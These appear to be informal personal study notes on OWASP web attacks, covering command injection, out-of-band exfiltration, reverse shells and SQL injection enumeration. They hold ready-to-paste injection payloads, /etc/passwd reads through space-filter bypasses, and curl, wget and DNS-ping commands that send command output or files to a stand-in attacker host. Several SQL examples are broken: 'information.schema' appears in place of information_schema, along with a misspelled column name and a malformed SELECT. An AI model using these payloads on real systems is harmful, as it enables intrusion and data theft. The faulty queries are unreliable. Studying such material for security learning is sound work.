# OWASP
## Command Injection
### Basics
whenever we see a suspicious input, we fuzz it. we need to use command separators.
> Recon means try to detect the injection. *it coms from recognize*
```console
; #cut the befoce cmd
&& #run this cmd if that command is tru
| #give result of last cmd to next
|| #is or
`code here` #it open a cmd executor
$(code here) #it opens a cmd exec
{code,here} #if we cant use space
cat$IFS/etc/passwd # if we cant use space ($IFS means space)
cat ${HOME:0:1}etc${HOME:0:1}passwd # {HOME:0:1} means /
```
Out of band means use web app for in out of boundry. *for example use to web send request to another space*
it can be DNS, HTTP or ...
we use this method when doesnt return the output of the injected command. for blind.
we request to our server.
```console
; wget attecker.com
```
#### let's read
- [we hacked apple for 3 months](samcurry.net/hacking-apple/#vuln4)
- [LocalTapiola: RCE using bash command](hackerone.com/reports/303061)

### Data Exfiltration
For Data Exfiltration (extracting data) u should use these two:
- HTTP Data Exfiltration
- DNS Data Exfiltration

#### HTTP
> search request catcher to get a simple server for testing out of bound.

for sending a command or file use these two:
```console
curl https://attacker.tld -d $(cmd) # for cmd result
curl https://attacker.tld --data-binary @/etc/passwd # for sending file
```
#### DNS
>  look for dns logger to get dns requests (DNS). an example is [DNSbin](dnsbin.zhack.ca)

command is:
```console
ping -c 1 $(whoami).attacker.tld # for sending cmd result
uname -a | od -A n -t x1 | sed 's/ *//g' | while read exfil; do ping -c 1 $exfil.attacker.tld; done # for sending hexed file
```
### Reverse Shell
for reverse shell we force the target machine to connect back to attacking machine.

Procedure:
- attacker's machine listen on a port
- victim's machine connect to the port
- victim spawns a shell
- attacker will have the shell

> look at this [site](revshells.com) for get some payload.

> commix is sth like sqlmap :)


## RCE
rce means u can put code in web app.
for inline import in python u can use this:
```python
__import__('PACKAGE_NAME').FUNCTINON('ARGS')
```

## SQL Injection
in sqli we wanna exploit the query.
this is a simple sqli
```sql
SELECT FROM USER WHERE username = ''; SELECT 1=1; --
```

### intraction
we have three kind of intraction between web app and sql.
- data returns directly to user
- data processed and the result shows to user
- nothing returns to user

#### Direct
look at this example:
> https://site.com/news/54

in this case 54 is id of a data in sql so the qury must be like one of this:
```sql
SELECT * FROM news WHERE news_id = $NEWSID;
SELECT * FROM news WHERE news_id = '$NEWSID';
SELECT * FROM news WHERE news_id = "$NEWSID";
```
so it shows all thing to us directly and we can exploit it by **UNION**.

#### Indirect
suppose we wanna buy sth from a shop and when we click on a product it query to sql and if it has it shows us exist else doesnt exist.
so in this case data is porocessed and then the result shown us.
query must be like this:
```sql
SELECT IF ((SELECT count FROM products WHERE product_id = $PRODUCT_ID) > 0, 1, 0) # 0 or 1
```
here doesnt show data just an effect of it.

*We use blind sqli in this case **(boolean based)***

#### NO result
for example for users and ips of a web app it doesnt show u any data. but will do sth.
```sql
INSERT INTO table_name VALUES (value1, value2, ...)
```
there is no view here but we have time effect.

*so we use blind sqli as a **time based***

### Explotation Flow
Based on user privilage we can do many things:
- pulling data from each databse that user has access
- read file
- write file
-  command excutaion

for extracting data u should know, ***data base name***, ***table name*** and ***column name***.

> **sqli** -> extract database names -> extract table names -> extract column names -> **pulling out data**

we can pull information with **information_schema**:
- `SELECT schema_name FROM information.schema.schemata` -> shows all database which the user has access to
- `SELECT table_name FROM information.schema.tables` -> shows all tables which the user has access to
- `SELECT column_name FROM information.schema.columns` -> shows all columns which the user has access to

u can use various fliters. for examle in this query it retunrns only column names of a specific database and table:
```SQL
SELECT group_concat(cloumn_name) FROM information.schema.columns WHERE table_schema='DATABASE_NAME' AND table_name='TABLE_NAME' 
```